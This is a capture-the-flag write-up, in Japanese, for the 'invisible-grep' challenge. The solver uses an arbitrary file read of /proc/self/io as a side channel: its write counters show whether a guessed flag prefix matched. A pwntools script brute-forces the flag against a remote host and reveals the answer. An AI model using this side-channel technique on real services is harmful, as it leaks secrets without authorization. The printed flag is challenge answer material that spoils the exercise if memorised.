# invisible-grep : Misc

フラグを食べる grep 作ってみた【おいしい】

flag format: `Alpaca{[a-z_]+}`

Attachment  
[invisible-grep.tar.gz](invisible-grep.tar.gz)  

Difficulty Level : Very Hard  
Tags : General  
Author : minaminao

# Solution

**問題概要**  

指定したファイルを読み込み、各行に対して指定した`pattern`が含まれているかをチェックする。
一致した行で"Alpaca"が含まれている場合と一致しない行が`/dev/null`に書き込まれる。
OSのファイルを読み込めることと、`/dev/null`に書き込まれることを利用するとflagが得られる。

**観察**  
```python
EXAMPLE_FILE = "/usr/share/dict/words"
FLAG_EATER = open("/dev/null", "w")
DUMMY_EATER = open("/dev/null", "w")

while True:
    file = input(f"File (Default: {EXAMPLE_FILE}, Flag: flag.txt): ")
    pattern = input("Pattern: ")
    content = open(file or EXAMPLE_FILE).read(0x10000)
    for line in content.splitlines():
        if pattern in line:
            print(line, file=FLAG_EATER if "Alpaca" in line else None)
        else:
            print(line, file=DUMMY_EATER) # dummy write to avoid timing attacks :)
```
* `/proc/self/io`を指定することで、wchar(writeされた合計バイト数)を出力できる。
* `FLAG_EATER`と`DUMMY_EATER`の`/dev/null`への書き込みは別カウントされる。
* バッファにある程度のデータが蓄積されるとフラッシュされて`/proc/self/io`に反映される。

**方針**  
指定した`pattern`が`flag.txt`の文字列と一致した場合は`FLAG_EATER`の`/dev/null`に書き込まれ、一致しない場合は`DUMMY_EATER`の`/dev/null`に書き込まれる。  
この挙動を利用して、`DUMMY_EATER`への書き込み量を`/proc/self/io`から確認することで、指定した`pattern`が`flag.txt`の文字列と一致したかどうかを確認する。

**手順**  
1. `flag.txt`を指定して、flag探索用の文字を`pattern`に入力する。
2. バッファがフラッシュされるまで`/usr/share/dict/words`の中身を`DUMMY_EATER`の`/dev/null`に書き込ませる。
3. `proc/self/io`の  wcahrにflagの文字列分の数字が反映されているか確認し、反映されていなければflagの文字列と一致したと判定する。

**Solver**
```python solve.py
from pwn import *

# context.log_level = "debug"
candidate = b"abcdefghijklmnopqrstuvwxyz_}"
pattern = b"Alpaca{"

while not pattern.endswith(b"}"):
    for i in candidate:
        p = remote("34.170.146.252", 44121)
        p.sendlineafter(b"txt): ", b"flag.txt")
        p.sendlineafter(b"Pattern: ", pattern+bytes([i]))
        print(pattern+bytes([i]))

        for _ in range(3):
            p.sendlineafter(b"txt): ", b"")
            p.sendlineafter(b"Pattern: ", b"aaaaaaaaaaaaaaaaaaaaaaaaaaa")

        p.sendlineafter(b"txt): ", b"/proc/self/io")
        p.sendlineafter(b"Pattern: ", b"")

        p.recvuntil(b"wchar: ")
        wchar = int(p.recvline().strip())

        if wchar == 123240:
            pattern += bytes([i])
            print(pattern)
            p.close()
            break
        else:
            p.close()
```

**Exploitation**  
```
$ python3 solve.py
...
b'Alpaca{busy_blue}'
```

Got the flag.

`Alpaca{busy_blue}`

# References
